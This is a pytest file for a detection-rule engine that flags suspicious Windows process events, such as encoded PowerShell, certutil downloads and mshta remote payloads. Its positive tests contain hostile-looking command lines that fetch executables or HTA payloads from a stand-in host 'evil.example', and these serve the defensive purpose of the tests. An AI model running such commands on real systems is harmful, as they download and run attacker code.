"""Tests for detect.rules and the shipped rule YAMLs (positive + negative)."""

from pathlib import Path

import pandas as pd
import pytest

from detect import rules
from detect.rules import FieldSpec, RuleEngine, load_rule

RULES_DIR = Path(__file__).parent.parent / "rules"

_COLS = ["action", "image", "command_line", "dest_port", "process_guid",
         "event_record_id", "timestamp", "technique_id"]


def ev(**kw):
    row = {c: None for c in _COLS}
    row["timestamp"] = "2021-03-01T12:00:00Z"
    row.update(kw)
    return row


def frame(rows):
    return pd.DataFrame(rows, columns=_COLS)


# --- shipped rules: positive hits -------------------------------------------

def test_shipped_rules_load():
    engine = RuleEngine.from_dir(RULES_DIR)
    ids = {r.id for r in engine.rules}
    assert {"ps-encoded-command", "certutil-download", "mshta-remote-payload"} <= ids


def test_positive_powershell_encoded():
    engine = RuleEngine.from_dir(RULES_DIR)
    alerts = engine.scan(frame([ev(
        action="process_create", process_guid="{p1}", event_record_id=1,
        image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        command_line="powershell.exe -nop -w hidden -enc ZABpAHIA",
    )]))
    assert alerts["rule_id"].tolist() == ["ps-encoded-command"]
    assert alerts.loc[0, "technique_id"] == "T1059.001"


def test_positive_certutil_download():
    engine = RuleEngine.from_dir(RULES_DIR)
    alerts = engine.scan(frame([ev(
        action="process_create", process_guid="{p2}", event_record_id=2,
        image=r"C:\Windows\System32\certutil.exe",
        command_line="certutil -urlcache -f http://evil.example/x.exe x.exe",
    )]))
    assert alerts["rule_id"].tolist() == ["certutil-download"]
    assert alerts.loc[0, "technique_id"] == "T1105"


def test_positive_mshta_remote():
    engine = RuleEngine.from_dir(RULES_DIR)
    alerts = engine.scan(frame([ev(
        action="process_create", process_guid="{p3}", event_record_id=3,
        image=r"C:\Windows\System32\mshta.exe",
        command_line="mshta https://evil.example/a.hta",
    )]))
    assert alerts["rule_id"].tolist() == ["mshta-remote-payload"]


# --- shipped rules: negatives (must NOT alert) ------------------------------

def test_negative_benign_powershell_and_certutil():
    engine = RuleEngine.from_dir(RULES_DIR)
    benign = frame([
        ev(action="process_create", process_guid="{b1}", event_record_id=10,
           image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
           command_line="powershell.exe Get-ChildItem C:\\Users"),
        ev(action="process_create", process_guid="{b2}", event_record_id=11,
           image=r"C:\Windows\System32\certutil.exe",
           command_line="certutil -hashfile report.pdf SHA256"),
        ev(action="network_connect", process_guid="{b3}", event_record_id=12, dest_port=443),
    ])
    assert engine.scan(benign).empty


# --- engine units ------------------------------------------------------------

def test_fieldspec_operators():
    assert FieldSpec("image", "endswith", [r"\powershell.exe"], False).match(
        {"image": r"C:\x\powershell.exe"})
    assert FieldSpec("command_line", "contains", ["-enc"], False).match(
        {"command_line": "x -ENC y"})  # case-insensitive
    assert FieldSpec("image", "re", [r"power\w+"], False).match({"image": "powershell.exe"})
    assert not FieldSpec("image", "equals", ["cmd.exe"], False).match({"image": None})


def test_fieldspec_all_modifier_is_and():
    spec = FieldSpec("command_line", "contains", ["-enc", "hidden"], require_all=True)
    assert spec.match({"command_line": "p -enc hidden"})
    assert not spec.match({"command_line": "p -enc only"})


def test_condition_or_and_not():
    doc = {
        "id": "r", "title": "r", "technique": "T0",
        "detection": {
            "a": {"image|endswith": "a.exe"},
            "b": {"image|endswith": "b.exe"},
            "condition": "a or b",
        },
    }
    rule = load_rule(doc)
    assert rule.match({"image": r"x\a.exe"})
    assert rule.match({"image": r"x\b.exe"})
    assert not rule.match({"image": r"x\c.exe"})

    doc["detection"]["condition"] = "a and not b"
    rule = load_rule(doc)
    assert rule.match({"image": r"x\a.exe"})


def test_condition_rejects_non_boolean_nodes():
    doc = {"id": "bad", "title": "bad",
           "detection": {"a": {"image": "x"}, "condition": "a and evil()"}}
    with pytest.raises(ValueError, match="unsupported condition"):
        load_rule(doc)


def test_missing_condition_raises():
    with pytest.raises(ValueError, match="no detection.condition"):
        load_rule({"id": "x", "title": "x", "detection": {"a": {"image": "y"}}})


# --- per-process rollup ------------------------------------------------------

def test_alerts_by_process_rollup():
    engine = RuleEngine.from_dir(RULES_DIR)
    alerts = engine.scan(frame([
        ev(action="process_create", process_guid="{p}", event_record_id=1,
           image=r"C:\Windows\System32\mshta.exe", command_line="mshta http://e/x"),
        ev(action="process_create", process_guid="{p}", event_record_id=2,
           image=r"C:\Windows\System32\certutil.exe",
           command_line="certutil -urlcache -f http://e/y y"),
    ]))
    rolled = rules.alerts_by_process(alerts)
    assert len(rolled) == 1
    r = rolled.iloc[0]
    assert r["process_guid"] == "{p}"
    assert r["n_alerts"] == 2
    assert "T1105" in r["techniques"] and "T1218.005" in r["techniques"]


def test_alerts_by_process_empty():
    assert rules.alerts_by_process(pd.DataFrame(columns=rules.ALERT_COLUMNS)).empty
